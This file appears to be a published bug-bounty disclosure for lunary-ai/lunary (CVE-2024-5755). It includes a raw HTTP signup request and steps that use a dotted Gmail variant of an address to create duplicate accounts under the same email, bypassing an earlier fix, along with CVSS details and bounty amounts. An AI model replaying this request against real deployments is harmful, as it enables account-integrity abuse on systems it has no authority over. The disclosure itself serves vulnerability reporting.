@@ -1,0 +1,46 @@
+Title: Creating account with same email (bypass https://huntr.com/bounties/2ca70ba5-b6a4-4873-bd55-bc6cef40d300) in lunary-ai/lunary
+
+Proof of Concept: 
+POST /auth/signup HTTP/2
+Host: myhost.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://myhost.com/
+Content-Type: application/json
+Authorization: Bearer null
+Content-Length: 225
+Origin: http://myhost.com/
+Dnt: 1
+Sec-Gpc: 1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Te: trailers
+
+{"email":"attacker123@gmail.com","password":"mypass123@","name":"uuuuu","projectName":"Project #1","orgName":"aaaa's Org","employeeCount":"1-5","signupMethod":"singup"}
+
+Send this request and a new account is created with email attacker123@gmail.com. After that send the same request but change email address to attacker.123@gmail.com. After this two account will be present with same email attacker123@gmail.com.
+
+Impact: 
+As same as the report https://huntr.com/bounties/2ca70ba5-b6a4-4873-bd55-bc6cef40d300
+
+CVE ID: CVE-2024-5755
+Status: (published)
+Vulnerability Type: CWE-821: Incorrect Synchronization
+Severity: Medium (5.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: None
+Availability: None
+Registry: Packagist
+Affected Version: <=v1.2.11
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $75
+Fix Bounty: $18.75
